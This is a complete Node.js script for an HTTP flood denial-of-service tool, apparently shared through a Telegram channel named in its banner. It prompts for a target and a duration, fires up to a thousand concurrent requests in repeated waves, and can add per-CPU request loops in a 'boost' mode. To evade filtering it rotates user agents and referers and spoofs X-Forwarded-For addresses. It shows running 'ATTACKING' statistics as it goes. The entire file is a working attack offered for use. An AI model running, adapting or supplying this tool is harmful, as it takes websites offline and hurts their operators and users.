const axios = require('axios');
const fs = require('fs');
const os = require('os');
const http = require('http');
const https = require('https');
const process = require('process');
const readline = require('readline');
const pLimit = require('p-limit').default;

const MAX_CONCURRENT = Math.min(os.cpus().length * 80, 1000);
const REQUEST_TIMEOUT = 10000;
const ANIMATION = ['|', '/', '-', '\\'];

const REFERERS = loadLines('refs.txt');
const USER_AGENTS = loadLines('ua.txt'); // updated from ua.txt

const keepAliveHttp = new http.Agent({ keepAlive: true });
const keepAliveHttps = new https.Agent({ keepAlive: true });

function loadLines(filename) {
    try {
        return fs.readFileSync(filename, 'utf8')
            .split('\n')
            .map(line => line.trim())
            .filter(Boolean);
    } catch {
        return [];
    }
}

function randomUserAgent() {
    return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)] || 'Mozilla/5.0';
}

function randomReferer() {
    return REFERERS[Math.floor(Math.random() * REFERERS.length)] || 'https://google.com';
}

function randomIp() {
    return Array(4).fill(0).map(() => Math.floor(Math.random() * 255)).join('.');
}

class AttackEngine {
    constructor(target, duration, boost = false) {
        this.target = target;
        this.duration = duration * 1000;
        this.startTime = Date.now();
        this.stats = { total: 0, success: 0, errors: 0, peakRps: 0 };
        this.limit = pLimit(MAX_CONCURRENT);
        this.boost = boost;
        this.spinnerIndex = 0;
    }

    async makeRequest() {
        const headers = {
            'User-Agent': randomUserAgent(),
            'Referer': randomReferer(),
            'X-Forwarded-For': randomIp()
        };

        try {
            const response = await axios.get(this.target, {
                headers,
                timeout: REQUEST_TIMEOUT,
                httpAgent: keepAliveHttp,
                httpsAgent: keepAliveHttps
            });
            return response.status === 200 ? 'SUCCESS' : 'ERROR';
        } catch {
            return 'ERROR';
        }
    }

    displayStats() {
        const elapsed = (Date.now() - this.startTime) / 1000;
        const rps = (this.stats.total / elapsed).toFixed(1);
        this.stats.peakRps = Math.max(this.stats.peakRps, parseFloat(rps));
        const spin = ANIMATION[this.spinnerIndex++ % ANIMATION.length];
        process.stdout.write(
            `\r${spin} ATTACKING | RPS: ${rps} | SUCCESS: ${this.stats.success} | ERRORS: ${this.stats.errors} | TOTAL: ${this.stats.total} | TIME: ${elapsed.toFixed(1)}s`
        );
    }

    async runLoop() {
        const promises = Array.from({ length: MAX_CONCURRENT }, () =>
            this.limit(() => this.makeRequest())
        );
        const results = await Promise.allSettled(promises);
        results.forEach(res => {
            this.stats.total++;
            if (res.status === 'fulfilled' && res.value === 'SUCCESS') {
                this.stats.success++;
            } else {
                this.stats.errors++;
            }
        });
    }

    async runBoostLoop() {
        while (Date.now() - this.startTime < this.duration) {
            await this.makeRequest();
        }
    }

    async runAttack() {
        const statInterval = setInterval(() => this.displayStats(), 200);

        const boosters = [];
        if (this.boost) {
            for (let i = 0; i < os.cpus().length; i++) {
                boosters.push(this.runBoostLoop());
            }
        }

        while (Date.now() - this.startTime < this.duration) {
            await this.runLoop();
        }

        clearInterval(statInterval);
        process.stdout.write('\n');
        await Promise.allSettled(boosters);
        this.printSummary();
    }

    printSummary() {
        const elapsed = (Date.now() - this.startTime) / 1000;
        const avgRps = (this.stats.total / elapsed).toFixed(1);
        console.log('\n\nATTACK COMPLETE');
        console.log('='.repeat(60));
        console.log(`TARGET: ${this.target}`);
        console.log(`DURATION: ${elapsed.toFixed(1)}s`);
        console.log(`TOTAL REQUESTS: ${this.stats.total}`);
        console.log(`SUCCESS (200): ${this.stats.success}`);
        console.log(`ERRORS: ${this.stats.errors}`);
        console.log(`AVERAGE RPS: ${avgRps}`);
        console.log(`PEAK RPS: ${this.stats.peakRps.toFixed(1)}`);
        console.log('='.repeat(60));
    }
}

// Main
(async () => {
    console.log('\nSNOWY2 - T.ME/STSVKINGDOM');
    console.log('='.repeat(60));

    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });

    const ask = (q) => new Promise(res => rl.question(q, res));

    let target = await ask("TARGET: ");
    if (!target.startsWith("http")) target = "http://" + target;
    const duration = parseInt(await ask("TIME (seconds): "));
    const boostChoice = await ask("ENABLE BOOST MODE? (yes/no): ");
    rl.close();

    if (isNaN(duration)) return console.log("Invalid time input.");

    const engine = new AttackEngine(target.trim(), duration, boostChoice.trim().toLowerCase() === 'yes');
    try {
        await engine.runAttack();
    } catch (err) {
        console.error("Attack failed:", err.message);
    }
})();
